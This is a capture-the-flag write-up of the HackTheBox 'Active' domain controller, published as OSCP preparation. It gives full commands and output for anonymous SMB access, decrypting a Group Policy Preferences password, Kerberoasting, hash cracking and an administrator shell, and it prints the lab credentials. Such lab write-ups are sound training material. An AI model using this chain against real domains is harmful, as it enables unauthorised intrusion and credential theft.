---
title: "Abusing Common Windows Misconfigurations (HackTheBox — Active)"
date: 2023-06-04
lane: "offense"
description: "A walkthrough of HackTheBox Active covering anonymous SMB access, Group Policy Preferences exploitation, and Kerberoasting to achieve domain admin on a Windows Server 2008 R2 domain controller."
tags: ["hackthebox", "windows", "kerberoasting", "active-directory", "smb", "privilege-escalation"]
featured: false
draft: false
canonical_url: "https://medium.com/bugbountywriteup/abusing-common-windows-misconfigurations-hackthebox-active-8aca6a8ee6b7"
---

## Introduction

Another blast from the past! This box is several years old but I decided to revisit a few windows boxes in preparation for the OSCP exam. This challenge covers some of the basic essentials of windows enumeration using rpc, smb, DNS and Active Directory.

Techniques and Vulnerabilities covered:

- Anonymous access to Windows shares
- Exploitation of Group Policy Preferences
- Kerberoasting

## Reconnaissance

As with any machine released on HTB, we generally start out with an nmap scan. This time, we are presented with a huge potential attack surface.

```
nmap -Pn -sC -sV -oA nmap/quick 10.129.178.216
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-26 16:02 ADT
Nmap scan report for 10.129.178.216
Host is up (0.10s latency).
Not shown: 983 closed tcp ports (conn-refused)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
49152/tcp open  msrpc         Microsoft Windows RPC
49153/tcp open  msrpc         Microsoft Windows RPC
49154/tcp open  msrpc         Microsoft Windows RPC
49155/tcp open  msrpc         Microsoft Windows RPC
49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49158/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1
```

One of the big challenges when presented with so many options is where to begin. But, we do learn that there's an LDAP response indicating a domain called active.htb. Let's use this and begin to enumerate the DNS service.

## DNS Enumeration

We point dnsrecon at the active service on port 53. This tool will attempt to perform a zone transfer, which, if successful, will disclose all of the DNS entries in the database.

```bash
dnsrecon -d active.htb -n 10.129.178.216 -a
[*] std: Performing General Enumeration against: active.htb...
[*] Checking for Zone Transfer for active.htb name servers
[*] Resolving SOA Record
[+]      SOA dc.active.htb 10.129.178.216
[*] Resolving NS Records
[*] NS Servers found:
[+]      NS dc.active.htb 10.129.178.216
[*] Trying NS server 10.129.178.216
[+] 10.129.178.216 Has port 53 TCP Open
[-] Zone Transfer Failed (Zone transfer error: REFUSED)
[-] Could not resolve domain: active.htb
```

It turns out this DNS service is configured to block zone transfer attacks. Let's continue to enumerate.

## SMB Enumeration

Enum4linux is a great tool for automating the enumeration of windows machines, I like to run it in verbose mode so I can see more details on the types of queries it is running.

```bash
enum4linux -v active.htb
```

I've included the tastiest bits from the output above… there are two interesting network shares on this machine: Replication and Users

We also learn that we can map to Replication with a null user and password using the following command:

```bash
smbclient -W 'WORKGROUP' //'active.htb'/'Replication' -U''%''
```

We can either browse around the folders via smbclient or download the entire structure with smbget.

Inside this Replication file, we land on a file called `Groups.xml` that contains a username `svc_tgs` and a value called `cpassword`, which appears to be an encrypted password for this user.

A little googling on this reminds us that cpassword is an AES-Encrypted password, but that Microsoft accidentally published the encryption key used, so we can reverse this without much difficulty using gpp-decrypt:

```bash
gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ
GPPstillStandingStrong2k18
```

Now that we have a username and password, we are able to use that to connect to the Users share:

```bash
smbclient -W 'WORKGROUP' //'active.htb'/'Users' -U'svc_tgs'%'GPPstillStandingStrong2k18'
smb: \> dir
  .                                  DR        0  Sat Jul 21 11:39:20 2018
  ..                                 DR        0  Sat Jul 21 11:39:20 2018
  Administrator                       D        0  Mon Jul 16 07:14:21 2018
  All Users                       DHSrn        0  Tue Jul 14 02:06:44 2009
  Default                           DHR        0  Tue Jul 14 03:38:21 2009
  Default User                    DHSrn        0  Tue Jul 14 02:06:44 2009
  desktop.ini                       AHS      174  Tue Jul 14 01:57:55 2009
  Public                             DR        0  Tue Jul 14 01:57:55 2009
  SVC_TGS                             D        0  Sat Jul 21 12:16:32 2018
```

The user flag is located in `/Users/SVC_TGS/Desktop`

## Privilege Escalation

This is pretty straight-forward, but for the purposes of enumeration you can use bloodhound to map out the domain and then use the built-in queries to list users who are "kerberoastable".

```bash
bloodhound-python -d active.htb -ns 10.129.178.216 -c All -u svc_tgs -p GPPstillStandingStrong2k18
```

In this case, Administrator cooks up nicely and can be served with a fresh side-salad! These tools are available from impacket, which can be installed via git:

```bash
git clone https://github.com/SecureAuthCorp/impacket.git
```

```bash
./GetUserSPNs.py -request active.htb/svc_tgs -dc-ip 10.129.178.216
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

Password:
ServicePrincipalName  Name           MemberOf                                                  PasswordLastSet             LastLogon                   Delegation
--------------------  -------------  --------------------------------------------------------  --------------------------  --------------------------  ----------
active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb  2018-07-18 16:06:40.351723  2023-05-26 15:53:10.138522

$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$65691efaf36c65bf2ce0f8df97c755d8$...
```

Now that we have the key, it can be cracked quickly using JTR:

```bash
john --format:krb5tgs admin.txt --wordlist=/usr/share/wordlists/rockyou.txt
Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
Ticketmaster1968 (?)
Session completed.
```

Finally, we log on as Administrator using another Impacket tool called wmiexec.py:

```bash
wmiexec.py active.htb/administrator:Ticketmaster1968@10.129.178.216
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] SMBv2.1 dialect used
[!] Launching semi-interactive shell - Careful what you execute
C:\>whoami
active\administrator
```

## Conclusions

This machine is an excellent introduction to the core concepts involved in pentesting Windows domains and networks. Even though it was launched several years ago, it still remains a popular challenge within the HTB community and is recommended for those seeking to get their OSCP. The challenge feels more real-world and less of the contrived easter-egg hunts that sometimes makes other challenges frustrating.

## Resources and Links

- [smbget documentation](https://www.samba.org/samba/docs/current/man-html/smbget.1.html)
- [MS14-025: Group Policy Preferences vulnerability](https://learn.microsoft.com/en-us/security-updates/SecurityBulletins/2014/ms14-025)
- [GPP cpassword specification](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-gppref/2c15cbf0-f086-4c74-8b70-1f2fa45dd4be)
- [Kerberoasting explained (CrowdStrike)](https://www.crowdstrike.com/cybersecurity-101/kerberoasting/)

---

*Originally published on [InfoSec Write-ups](https://medium.com/bugbountywriteup/abusing-common-windows-misconfigurations-hackthebox-active-8aca6a8ee6b7)*

`bksp_ // undoing what shouldn't have shipped`
